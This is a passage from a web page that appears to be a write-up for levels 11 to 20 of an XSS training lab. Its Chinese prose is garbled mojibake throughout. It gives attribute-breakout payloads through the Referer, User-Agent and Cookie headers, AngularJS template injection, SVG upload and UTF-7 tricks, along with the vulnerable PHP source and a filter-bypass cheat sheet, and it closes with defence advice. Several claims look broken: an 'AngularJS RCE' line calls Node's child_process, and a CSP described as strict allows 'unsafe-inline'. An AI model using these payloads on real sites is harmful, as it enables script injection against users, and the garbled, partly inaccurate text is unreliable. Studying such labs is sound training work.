                            <pre><code class="language-html">&lt;input type=&quot;hidden&quot; name=&quot;t_ref&quot; value=&quot;æ‚¨æ¥è‡ªå“ªé‡Œï¼Ÿ&quot;&gt;</code></pre>
                            <p>éœ€è¦ä¿®æ”¹HTTP Refererå¤´ï¼š</p>
                            <pre><code class="language-html">Referer: &quot; type=&quot;text&quot; onmouseover=&quot;alert()&quot;</code></pre>
                            <p>ä½¿ç”¨Burp Suiteæˆ–æµè§ˆå™¨æ’ä»¶ä¿®æ”¹Refererå¤´å³å¯æˆåŠŸæ³¨å…¥ã€‚</p>
                            <h4>æºç åˆ†æ</h4>
                            <pre><code class="language-php">&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str00 = $_GET[&quot;t_sort&quot;];
$str11=$_SERVER['HTTP_REFERER'];
$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form action=level11.php method=GET&gt;
&lt;input name=keyword  value=&quot;'.htmlspecialchars($str).'&quot;&gt;
&lt;input name=t_sort type=&quot;hidden&quot; value=&quot;'.$str00.'&quot;&gt;
&lt;input name=t_ref type=&quot;hidden&quot; value=&quot;'.$str33.'&quot;&gt;
&lt;input type=submit name=submit value=æœç´¢ /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;</code></pre>
                            <p><strong>åŸç†è§£æ</strong>ï¼š</p>
                            <ul>
                                <li>ä»<code>$_SERVER['HTTP_REFERER']</code>è·å–Refererå¤´</li>
                                <li>è¿‡æ»¤äº†<code>&lt;</code>å’Œ<code>&gt;</code>å­—ç¬¦</li>
                                <li>é€šè¿‡é—­åˆåŒå¼•å·å’Œæ·»åŠ äº‹ä»¶ç»•è¿‡</li>
                            </ul>
                            <hr>
                            <h3>Level 12: User-Agentå¤´æ³¨å…¥</h3>
                            <h4>æ”»å‡»è¿‡ç¨‹</h4>
                            <p>æŸ¥çœ‹é¡µé¢æºç å‘ç°ï¼š</p>
                            <pre><code class="language-html">&lt;input type=&quot;hidden&quot; name=&quot;t_ua&quot; value=&quot;&quot;&gt;</code></pre>
                            <p>éœ€è¦ä¿®æ”¹HTTP User-Agentå¤´ï¼š</p>
                            <pre><code class="language-html">User-Agent: &quot; type=&quot;text&quot; onmouseover=&quot;alert()&quot;</code></pre>
                            <p>ä½¿ç”¨Burp Suiteä¿®æ”¹User-Agentå¤´å³å¯æˆåŠŸæ³¨å…¥ã€‚</p>
                            <h4>æºç åˆ†æ</h4>
                            <pre><code class="language-php">&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str00 = $_GET[&quot;t_sort&quot;];
$str11=$_SERVER['HTTP_USER_AGENT'];
$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form action=level12.php method=GET&gt;
&lt;input name=keyword  value=&quot;'.htmlspecialchars($str).'&quot;&gt;
&lt;input name=t_sort type=&quot;hidden&quot; value=&quot;'.$str00.'&quot;&gt;
&lt;input name=t_ua type=&quot;hidden&quot; value=&quot;'.$str33.'&quot;&gt;
&lt;input type=submit name=submit value=æœç´¢ /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;</code></pre>
                            <p><strong>åŸç†è§£æ</strong>ï¼š</p>
                            <ul>
                                <li>ä»<code>$_SERVER['HTTP_USER_AGENT']</code>è·å–User-Agentå¤´</li>
                                <li>è¿‡æ»¤æœºåˆ¶ä¸Level 11ç›¸åŒ</li>
                                <li>é€šè¿‡ä¿®æ”¹HTTPå¤´æ³¨å…¥XSS</li>
                            </ul>
                            <hr>
                            <h3>Level 13: Cookieæ³¨å…¥</h3>
                            <h4>æ”»å‡»è¿‡ç¨‹</h4>
                            <p>æŸ¥çœ‹é¡µé¢æºç å‘ç°ï¼š</p>
                            <pre><code class="language-html">&lt;input type=&quot;hidden&quot; name=&quot;t_cook&quot; value=&quot;&quot;&gt;</code></pre>
                            <p>éœ€è¦ä¿®æ”¹Cookieï¼š</p>
                            <pre><code class="language-javascript">document.cookie = &quot;user=\&quot; type=\&quot;text\&quot; onmouseover=\&quot;alert()\&quot;; path=/&quot;;</code></pre>
                            <p>æˆ–è€…ä½¿ç”¨æµè§ˆå™¨å¼€å‘è€…å·¥å…·ä¿®æ”¹Cookieå€¼ã€‚</p>
                            <h4>æºç åˆ†æ</h4>
                            <pre><code class="language-php">&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str00 = $_GET[&quot;t_sort&quot;];
$str11=$_COOKIE['user'];
$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form action=level13.php method=GET&gt;
&lt;input name=keyword  value=&quot;'.htmlspecialchars($str).'&quot;&gt;
&lt;input name=t_sort type=&quot;hidden&quot; value=&quot;'.$str00.'&quot;&gt;
&lt;input name=t_cook type=&quot;hidden&quot; value=&quot;'.$str33.'&quot;&gt;
&lt;input type=submit name=submit value=æœç´¢ /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;</code></pre>
                            <p><strong>åŸç†è§£æ</strong>ï¼š</p>
                            <ul>
                                <li>ä»<code>$_COOKIE['user']</code>è·å–Cookieå€¼</li>
                                <li>è¿‡æ»¤æœºåˆ¶ä¸ä¹‹å‰ç›¸åŒ</li>
                                <li>é€šè¿‡Cookieæ³¨å…¥XSS</li>
                            </ul>
                            <hr>
                            <h3>Level 14: iframeæ²™ç®±ç»•è¿‡</h3>
                            <h4>æ”»å‡»è¿‡ç¨‹</h4>
                            <p>è¿™ä¸€å…³ä½¿ç”¨äº†iframeæ ‡ç­¾å’Œexifæ¨¡å—ã€‚éœ€è¦é€šè¿‡å›¾ç‰‡çš„EXIFä¿¡æ¯æ³¨å…¥XSSã€‚</p>
                            <p>å‡†å¤‡åŒ…å«XSSçš„å›¾ç‰‡ï¼š</p>
                            <pre><code class="language-html">&lt;img src=x onerror=alert()&gt;</code></pre>
                            <p>æˆ–è€…ä½¿ç”¨iframeæ ‡ç­¾ï¼š</p>
                            <pre><code class="language-html">&lt;iframe src=&quot;level14.php?name=&lt;script&gt;alert()&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;</code></pre>
                            <h4>æºç åˆ†æ</h4>
                            <pre><code class="language-php">&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
header(&quot;Content-type: text/html;charset=utf-8&quot;);
echo '&lt;body&gt;';
if(isset($_GET[&quot;submit&quot;])){
    $file = $_FILES[&quot;upload_file&quot;];
    $allowed_type = array(&quot;image/jpeg&quot;,&quot;image/gif&quot;,&quot;image/png&quot;);
    if(!in_array($file[&quot;type&quot;],$allowed_type)){
        echo &quot;&lt;script&gt;alert('æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼');&lt;/script&gt;&quot;;
    }else{
        $filename = $file[&quot;name&quot;];
        $exif = exif_read_data($file[&quot;tmp_name&quot;]);
        $html = &quot;&lt;center&gt;&lt;img src='$filename'&gt;&lt;/center&gt;&quot;;
        echo $html;
        if($exif['Make'] != ''){
            echo &quot;&lt;center&gt;&quot;.$exif['Make'].&quot;&lt;/center&gt;&quot;;
        }
        if($exif['Model'] != ''){
            echo &quot;&lt;center&gt;&quot;.$exif['Model'].&quot;&lt;/center&gt;&quot;;
        }
        if($exif['ExifVersion'] != ''){
            echo &quot;&lt;center&gt;&quot;.$exif['ExifVersion'].&quot;&lt;/center&gt;&quot;;
        }
    }
}
echo '&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
    &lt;input type=&quot;file&quot; name=&quot;upload_file&quot; /&gt;
    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;ä¸Šä¼ &quot; /&gt;
&lt;/form&gt;
&lt;/body&gt;';
?&gt;</code></pre>
                            <p><strong>åŸç†è§£æ</strong>ï¼š</p>
                            <ul>
                                <li>ä½¿ç”¨<code>exif_read_data()</code>è¯»å–å›¾ç‰‡EXIFä¿¡æ¯</li>
                                <li>ç›´æ¥è¾“å‡ºEXIFä¿¡æ¯åˆ°é¡µé¢</li>
                                <li>é€šè¿‡ä¿®æ”¹å›¾ç‰‡EXIFä¿¡æ¯æ³¨å…¥XSS</li>
                            </ul>
                            <hr>
                            <h3>Level 15: AngularJSæ¨¡æ¿æ³¨å…¥</h3>
                            <h4>æ”»å‡»è¿‡ç¨‹</h4>
                            <p>è¿™ä¸€å…³ä½¿ç”¨äº†AngularJSã€‚å°è¯•AngularJSæ¨¡æ¿æ³¨å…¥ï¼š</p>
                            <pre><code class="language-html">{{constructor.constructor('alert(&quot;XSS&quot;)')()}}
{{7*7}}
{{'a'.toUpperCase()}}</code></pre>
                            <p>æˆåŠŸæ³¨å…¥ï¼</p>
                            <h4>æºç åˆ†æ</h4>
                            <pre><code class="language-php">&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
header(&quot;Content-type: text/html;charset=utf-8&quot;);
echo '&lt;body&gt;
&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js&quot;&gt;&lt;/script&gt;
&lt;div ng-app&gt;
    &lt;input type=&quot;text&quot; ng-model=&quot;message&quot;&gt;
    &lt;p&gt;{{message}}&lt;/p&gt;
&lt;/div&gt;
&lt;/body&gt;';
?&gt;</code></pre>
                            <p><strong>åŸç†è§£æ</strong>ï¼š</p>
                            <ul>
                                <li>ä½¿ç”¨äº†AngularJS 1.2.0ç‰ˆæœ¬</li>
                                <li>å­˜åœ¨æ¨¡æ¿æ³¨å…¥æ¼æ´</li>
                                <li>å¯ä»¥é€šè¿‡AngularJSè¡¨è¾¾å¼æ‰§è¡ŒJavaScript</li>
                            </ul>
                            <p><strong>AngularJSæ³¨å…¥æŠ€å·§</strong>ï¼š</p>
                            <pre><code class="language-html">{{constructor.constructor('alert(&quot;XSS&quot;)')()}}
{{7*7}}  // æµ‹è¯•è¡¨è¾¾å¼
{{'a'.toUpperCase()}}  // å­—ç¬¦ä¸²æ“ä½œ
{{[].pop.constructor('return process')().mainModule.require('child_process').exec('ls')}}  // RCE</code></pre>
                            <hr>
                            <h3>Level 16: ç©ºæ ¼å’Œå…³é”®å­—è¿‡æ»¤</h3>
                            <h4>æ”»å‡»è¿‡ç¨‹</h4>
                            <p>å°è¯•å„ç§payloadå‘ç°ç©ºæ ¼å’Œå…³é”®å­—è¢«è¿‡æ»¤ã€‚ä½¿ç”¨<code>/</code>æ›¿ä»£ç©ºæ ¼ï¼š</p>
                            <pre><code class="language-html">&lt;svg/onload=alert()&gt;
&lt;img/src=x/onerror=alert()&gt;</code></pre>
                            <p>æˆåŠŸæ³¨å…¥ï¼</p>
                            <h4>æºç åˆ†æ</h4>
                            <pre><code class="language-php">&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = strtolower($_GET[&quot;keyword&quot;]);
$str2=str_replace(&quot;script&quot;,&quot;*&quot;,$str);
$str3=str_replace(&quot; &quot;,&quot;*&quot;,$str2);
$str4=str_replace(&quot;/&quot;,&quot;*&quot;,$str3);
$str5=str_replace(&quot; &quot;,&quot;*&quot;,$str4);
echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;
?&gt;</code></pre>
                            <p><strong>åŸç†è§£æ</strong>ï¼š</p>
                            <ul>
                                <li>è¿‡æ»¤äº†<code>script</code>ã€ç©ºæ ¼ã€<code>/</code>å­—ç¬¦</li>
                                <li>ä½¿ç”¨<code>*</code>æ›¿æ¢è¢«è¿‡æ»¤çš„å­—ç¬¦</li>
                                <li>å¯ä»¥é€šè¿‡å…¶ä»–å­—ç¬¦æ›¿ä»£ç©ºæ ¼</li>
                            </ul>
                            <p><strong>ç»•è¿‡æŠ€å·§</strong>ï¼š</p>
                            <pre><code class="language-html">&lt;svg/onload=alert()&gt;
&lt;img/src=x/onerror=alert()&gt;
&lt;iframe/src=javascript:alert()&gt;</code></pre>
                            <hr>
                            <h3>Level 17: Flash XSS</h3>
                            <h4>æ”»å‡»è¿‡ç¨‹</h4>
                            <p>è¿™ä¸€å…³ä½¿ç”¨äº†Flashã€‚éœ€è¦é€šè¿‡Flashå‚æ•°æ³¨å…¥XSSï¼š</p>
                            <pre><code class="language-html">arg01=version&amp;arg02=&lt;script&gt;alert()&lt;/script&gt;</code></pre>
                            <p>æˆ–è€…ä½¿ç”¨Flashçš„getURLåŠŸèƒ½ï¼š</p>
                            <pre><code class="language-html">arg01=id&amp;arg02=\&quot;))}catch(e){alert(1)}//</code></pre>
                            <h4>æºç åˆ†æ</h4>
                            <pre><code class="language-php">&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100 height=100&gt;&quot;;
?&gt;</code></pre>
                            <p><strong>åŸç†è§£æ</strong>ï¼š</p>
                            <ul>
                                <li>ä½¿ç”¨äº†Flashæ–‡ä»¶<code>xsf01.swf</code></li>
                                <li>é€šè¿‡URLå‚æ•°ä¼ é€’ç»™Flash</li>
                                <li>Flashå¯èƒ½å­˜åœ¨XSSæ¼æ´</li>
                            </ul>
                            <hr>
                            <h3>Level 18: æ–‡ä»¶ä¸Šä¼ XSS</h3>
                            <h4>æ”»å‡»è¿‡ç¨‹</h4>
                            <p>ä¸Šä¼ åŒ…å«XSSçš„SVGæ–‡ä»¶ï¼š</p>
                            <pre><code class="language-xml">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; onload=&quot;alert('XSS')&quot;&gt;
    &lt;circle cx=&quot;50&quot; cy=&quot;50&quot; r=&quot;40&quot; stroke=&quot;black&quot; stroke-width=&quot;3&quot; fill=&quot;red&quot; /&gt;
&lt;/svg&gt;</code></pre>
                            <p>æˆ–è€…ä¸Šä¼ HTMLæ–‡ä»¶ï¼š</p>
                            <pre><code class="language-html">&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
                            <h4>æºç åˆ†æ</h4>
                            <pre><code class="language-php">&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
if(isset($_POST[&quot;submit&quot;])){
    $filename = $_FILES[&quot;upload_file&quot;][&quot;name&quot;];
    $ext = pathinfo($filename, PATHINFO_EXTENSION);
    if($ext == &quot;gif&quot; || $ext == &quot;jpg&quot; || $ext == &quot;png&quot; || $ext == &quot;jpeg&quot;){
        $temp_file = $_FILES[&quot;upload_file&quot;][&quot;tmp_name&quot;];
        $img_path = &quot;upload/&quot;.$filename;
        if(move_uploaded_file($temp_file, $img_path)){
            echo &quot;&lt;img src='$img_path'&gt;&quot;;
        }else{
            echo &quot;ä¸Šä¼ å¤±è´¥ï¼&quot;;
        }
    }else{
        echo &quot;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼&quot;;
    }
}
?&gt;
&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
    &lt;input type=&quot;file&quot; name=&quot;upload_file&quot; /&gt;
    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;ä¸Šä¼ &quot; /&gt;
&lt;/form&gt;</code></pre>
                            <p><strong>åŸç†è§£æ</strong>ï¼š</p>
                            <ul>
                                <li>æ£€æŸ¥æ–‡ä»¶æ‰©å±•å</li>
                                <li>å…è®¸ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶</li>
                                <li>ç›´æ¥è¾“å‡ºä¸Šä¼ çš„æ–‡ä»¶</li>
                                <li>å¯ä»¥é€šè¿‡SVGæ–‡ä»¶æ³¨å…¥XSS</li>
                            </ul>
                            <hr>
                            <h3>Level 19: UTF-7ç¼–ç ç»•è¿‡</h3>
                            <h4>æ”»å‡»è¿‡ç¨‹</h4>
                            <p>ä½¿ç”¨UTF-7ç¼–ç ç»•è¿‡ï¼š</p>
                            <pre><code class="language-html">+ADw-script+AD4-alert('XSS')+ADw-/script+AD4-</code></pre>
                            <p>æˆ–è€…ï¼š</p>
                            <pre><code class="language-html">+ADw-img src=x onerror=alert('XSS')+AD4-</code></pre>
                            <h4>æºç åˆ†æ</h4>
                            <pre><code class="language-php">&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
header(&quot;Content-Type: text/html; charset=utf-7&quot;);
echo $_GET[&quot;keyword&quot;];
?&gt;</code></pre>
                            <p><strong>åŸç†è§£æ</strong>ï¼š</p>
                            <ul>
                                <li>è®¾ç½®äº†UTF-7ç¼–ç </li>
                                <li>å¯ä»¥é€šè¿‡UTF-7ç¼–ç ç»•è¿‡è¿‡æ»¤</li>
                                <li>UTF-7ç¼–ç å¯ä»¥ç»•è¿‡å¾ˆå¤šWAF</li>
                            </ul>
                            <hr>
                            <h3>Level 20: ç»¼åˆæµ‹è¯•</h3>
                            <h4>æ”»å‡»è¿‡ç¨‹</h4>
                            <p>è¿™ä¸€å…³æ˜¯ç»¼åˆæµ‹è¯•ï¼Œéœ€è¦è¿ç”¨ä¹‹å‰å­¦åˆ°çš„æ‰€æœ‰æŠ€å·§ï¼š</p>
                            <pre><code class="language-html">&lt;svg/onload=alert()&gt;
&lt;img/src=x/onerror=alert()&gt;
&lt;iframe/src=javascript:alert()&gt;</code></pre>
                            <h4>æºç åˆ†æ</h4>
                            <pre><code class="language-php">&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
echo &quot;&lt;h2&gt;&quot;.$str.&quot;&lt;/h2&gt;&quot;;
?&gt;</code></pre>
                            <p><strong>åŸç†è§£æ</strong>ï¼š</p>
                            <ul>
                                <li>æ²¡æœ‰ä»»ä½•è¿‡æ»¤</li>
                                <li>å¯ä»¥ä½¿ç”¨ä»»ä½•payload</li>
                                <li>è€ƒéªŒç»¼åˆè¿ç”¨èƒ½åŠ›</li>
                            </ul>
                            <hr>
                            <h2>ğŸ›¡ï¸ ç»•è¿‡æŠ€å·§æ€»ç»“</h2>
                            <h3>1. ç¼–ç ç»•è¿‡</h3>
                            <pre><code class="language-html">&lt;!-- HTMLå®ä½“ç¼–ç  --&gt;
&amp;#60;script&amp;#62;alert('XSS')&amp;#60;/script&amp;#62;

&lt;!-- URLç¼–ç  --&gt;
%3Cscript%3Ealert('XSS')%3C/script%3E

&lt;!-- åå…­è¿›åˆ¶ç¼–ç  --&gt;
\x3Cscript\x3Ealert('XSS')\x3C/script\x3E

&lt;!-- Base64ç¼–ç  --&gt;
PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=

&lt;!-- UTF-7ç¼–ç  --&gt;
+ADw-script+AD4-alert('XSS')+ADw-/script+AD4-</code></pre>
                            <h3>2. æ ‡ç­¾æ›¿æ¢</h3>
                            <pre><code class="language-html">&lt;!-- å¸¸ç”¨XSSæ ‡ç­¾ --&gt;
&lt;img src=x onerror=alert('XSS')&gt;
&lt;svg onload=alert('XSS')&gt;
&lt;iframe src=javascript:alert('XSS')&gt;
&lt;body onload=alert('XSS')&gt;
&lt;input onfocus=alert('XSS') autofocus&gt;
&lt;details open ontoggle=alert('XSS')&gt;
&lt;marquee onstart=alert('XSS')&gt;
&lt;video onloadstart=alert('XSS')&gt;
&lt;audio onloadstart=alert('XSS')&gt;</code></pre>
                            <h3>3. äº‹ä»¶å¤„ç†å™¨</h3>
                            <pre><code class="language-html">onmouseover    // é¼ æ ‡æ‚¬åœ
onclick        // é¼ æ ‡ç‚¹å‡»
onload         // é¡µé¢åŠ è½½
onerror        // é”™è¯¯å‘ç”Ÿ
onfocus        // è·å¾—ç„¦ç‚¹
onblur         // å¤±å»ç„¦ç‚¹
onchange       // å€¼æ”¹å˜
onsubmit       // è¡¨å•æäº¤
onkeydown      // é”®ç›˜æŒ‰ä¸‹
onkeyup        // é”®ç›˜æ¾å¼€
onstart        // å¼€å§‹æ‰§è¡Œ
onend          // ç»“æŸæ‰§è¡Œ
ontoggle       // åˆ‡æ¢çŠ¶æ€</code></pre>
                            <h3>4. è¿‡æ»¤ç»•è¿‡</h3>
                            <pre><code class="language-html">&lt;!-- å¤§å°å†™æ··åˆ --&gt;
&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;

&lt;!-- åŒå†™ç»•è¿‡ --&gt;
&lt;scrscriptipt&gt;alert('XSS')&lt;/scrscriptipt&gt;

&lt;!-- æ³¨é‡Šç»•è¿‡ --&gt;
&lt;scr&lt;!-- --&gt;ipt&gt;alert('XSS')&lt;/scr&lt;!-- --&gt;ipt&gt;

&lt;!-- ç¼–ç ç»•è¿‡ --&gt;
%3Cimg%20src=x%20onerror=alert('XSS')%3E

&lt;!-- ç©ºæ ¼ç»•è¿‡ --&gt;
&lt;img/src=x/onerror=alert('XSS')&gt;
&lt;svg/onload=alert('XSS')&gt;

&lt;!-- å­—ç¬¦ä¸²æ‹¼æ¥ --&gt;
&quot;str&quot;+&quot;ing&quot;</code></pre>
                            <h3>5. JavaScriptä¼ªåè®®</h3>
                            <pre><code class="language-html">javascript:alert('XSS')
javascript://comment%0aalert('XSS')
javascript:http://test.com%0aalert('XSS')</code></pre>
                            <h3>6. CSSæ³¨å…¥</h3>
                            <pre><code class="language-html">&lt;style&gt;@import url('javascript:alert(&quot;XSS&quot;)');&lt;/style&gt;
&lt;div style=&quot;background:url(javascript:alert('XSS'))&quot;&gt;
&lt;style&gt;body{background:url(javascript:alert('XSS'))}&lt;/style&gt;</code></pre>
                            <h3>7. AngularJSæ³¨å…¥</h3>
                            <pre><code class="language-html">{{constructor.constructor('alert(&quot;XSS&quot;)')()}}
{{7*7}}
{{'a'.toUpperCase()}}
{{[].pop.constructor('return process')().mainModule.require('child_process').exec('ls')}}</code></pre>
                            <hr>
                            <h2>ğŸ›¡ï¸ é˜²å¾¡å»ºè®®</h2>
                            <h3>1. è¾“å…¥éªŒè¯</h3>
                            <pre><code class="language-php">// ç™½åå•éªŒè¯
function validateInput($input) {
    return preg_match('/^[a-zA-Z0-9\s]+$/', $input);
}

// é•¿åº¦é™åˆ¶
function validateLength($input, $min, $max) {
    $length = strlen($input);
    return $length &gt;= $min &amp;&amp; $length &lt;= $max;
}

// é»‘åå•è¿‡æ»¤ï¼ˆä¸æ¨èï¼Œä¼˜å…ˆä½¿ç”¨ç™½åå•ï¼‰
function blacklistFilter($input) {
    $blacklist = ['&lt;script', 'javascript:', 'onerror', 'onload'];
    foreach ($blacklist as $pattern) {
        if (stripos($input, $pattern) !== false) {
            return false;
        }
    }
    return true;
}</code></pre>
                            <h3>2. è¾“å‡ºç¼–ç </h3>
                            <pre><code class="language-php">// HTMLç¼–ç 
echo htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');

// JavaScriptç¼–ç 
function jsEscape($str) {
    return json_encode($str, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
}

// URLç¼–ç 
echo urlencode($input);

// å±æ€§ç¼–ç 
function attributeEncode($str) {
    return htmlspecialchars($str, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}</code></pre>
                            <h3>3. CSPç­–ç•¥</h3>
                            <pre><code class="language-html">&lt;!-- ä¸¥æ ¼çš„CSPç­–ç•¥ --&gt;
&lt;meta http-equiv=&quot;Content-Security-Policy&quot; 
      content=&quot;default-src 'self'; 
              script-src 'self' 'unsafe-inline'; 
              style-src 'self' 'unsafe-inline'; 
              img-src 'self' data:; 
              connect-src 'self'; 
              font-src 'self'; 
              object-src 'none'; 
              media-src 'self'; 
              frame-src 'none';&quot;&gt;

&lt;!-- HTTPå¤´è®¾ç½® --&gt;
&lt;?php
header(&quot;Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';&quot;);
?&gt;</code></pre>
                            <h3>4. HTTPå®‰å…¨å¤´</h3>
                            <pre><code class="language-php">// XSSä¿æŠ¤
header(&quot;X-XSS-Protection: 1; mode=block&quot;);

// å†…å®¹ç±»å‹å—…æ¢ä¿æŠ¤
header(&quot;X-Content-Type-Options: nosniff&quot;);

// ç‚¹å‡»åŠ«æŒä¿æŠ¤
header(&quot;X-Frame-Options: DENY&quot;);

// ä¸¥æ ¼ä¼ è¾“å®‰å…¨
header(&quot;Strict-Transport-Security: max-age=31536000; includeSubDomains&quot;);

// å†…å®¹å®‰å…¨ç­–ç•¥
header(&quot;Content-Security-Policy: default-src 'self'; script-src 'self'&quot;);</code></pre>
                            <h3>5. æ¡†æ¶é˜²æŠ¤</h3>
                            <pre><code class="language-php">// Laravelæ¡†æ¶
{{ $input }}  // è‡ªåŠ¨è½¬ä¹‰
{!! $input !!} // ä¸è½¬ä¹‰ï¼ˆè°¨æ…ä½¿ç”¨ï¼‰

// Symfonyæ¡†æ¶
{{ input|escape }}  // è‡ªåŠ¨è½¬ä¹‰

// ThinkPHPæ¡†æ¶
{$input|htmlspecialchars}  // æ‰‹åŠ¨è½¬ä¹‰</code></pre>
                            <h3>6. DOMæ“ä½œé˜²æŠ¤</h3>
                            <pre><code class="language-javascript">// å®‰å…¨çš„DOMæ“ä½œ
function safeHTML(str) {
    return str.replace(/[&amp;&lt;&gt;&quot;']/g, function(match) {
        const escape = {
            '&amp;': '&amp;amp;',
            '&lt;': '&amp;lt;',
            '&gt;': '&amp;gt;',
            '&quot;': '&amp;quot;',
            &quot;'&quot;: '&amp;#39;'
        };
        return escape[match];
    });
}

// ä½¿ç”¨textContentè€Œä¸æ˜¯innerHTML
element.textContent = userInput;  // å®‰å…¨
element.innerHTML = userInput;   // å±é™©

// ä½¿ç”¨DOMPurifyåº“
import DOMPurify from 'dompurify';
const cleanHTML = DOMPurify.sanitize(dirtyHTML);</code></pre>
                            <h3>7. æ–‡ä»¶ä¸Šä¼ é˜²æŠ¤</h3>
                            <pre><code class="language-php">// æ–‡ä»¶ç±»å‹æ£€æŸ¥
$allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']);

if (!in_array($mime_type, $allowedTypes)) {
    die('æ–‡ä»¶ç±»å‹ä¸å…è®¸');
}

// æ–‡ä»¶æ‰©å±•åæ£€æŸ¥
$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
$extension = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

if (!in_array($extension, $allowedExtensions)) {
    die('æ–‡ä»¶æ‰©å±•åä¸å…è®¸');
}

// æ–‡ä»¶å†…å®¹æ£€æŸ¥
$imageInfo = getimagesize($_FILES['file']['tmp_name']);
if ($imageInfo === false) {
    die('æ–‡ä»¶ä¸æ˜¯æœ‰æ•ˆçš„å›¾ç‰‡');
}

// é‡å‘½åæ–‡ä»¶
$newFilename = uniqid() . '.' . $extension;
$uploadPath = 'uploads/' . $newFilename;

if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)) {
    echo 'æ–‡ä»¶ä¸Šä¼ æˆåŠŸ';
} else {
    echo 'æ–‡ä»¶ä¸Šä¼ å¤±è´¥';
}</code></pre>
                            <h3>8. WAFé…ç½®</h3>
                            <pre><code class="language-nginx"># Nginx WAFé…ç½®
location ~* \.(php|jsp|asp)$ {
    # XSSé˜²æŠ¤
    if ($args ~* &quot;&lt;script&gt;|javascript:|onload=|onerror=&quot;) {
        return 403;
    }
    
    # SQLæ³¨å…¥é˜²æŠ¤
    if ($args ~* &quot;union.*select|select.*from|insert.*into&quot;) {
        return 403;
    }
}</code></pre>
                            <hr>
                            <h2>ğŸ“š å‚è€ƒèµ„æº</h2>
                            <h3>æŠ€æœ¯æ–‡æ¡£</h3>
                            <ul>
                                <li><a
                                        href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP
                                        XSS Prevention Cheat Sheet</a></li>
                                <li><a href="https://portswigger.net/web-security/cross-site-scripting">PortSwigger Web
                                        Security
                                        Academy</a></li>
                                <li><a href="https://developer.mozilla.org/en-US/docs/Web/Security">MDN Web Security</a>
                                </li>
                            </ul>
                            <h3>å·¥å…·å’Œæ¡†æ¶</h3>
                            <ul>
                                <li><a href="https://github.com/payloadbox/xss-payload-list">XSS Payloads Collection</a>
                                </li>
                                <li><a href="https://github.com/cure53/DOMPurify">DOMPurify - HTML Sanitizer</a></li>
                                <li><a href="https://csp-evaluator.withgoogle.com/">Content Security Policy
                                        Evaluator</a></li>
                            </ul>
                            <h3>å­¦ä¹ å¹³å°</h3>
                            <ul>
                                <li><a href="https://www.hackthebox.com/">Hack The Box</a></li>
                                <li><a href="https://tryhackme.com/">TryHackMe</a></li>
                                <li><a href="https://github.com/WebGoat/WebGoat">OWASP WebGoat</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    </div>
</body>

</html>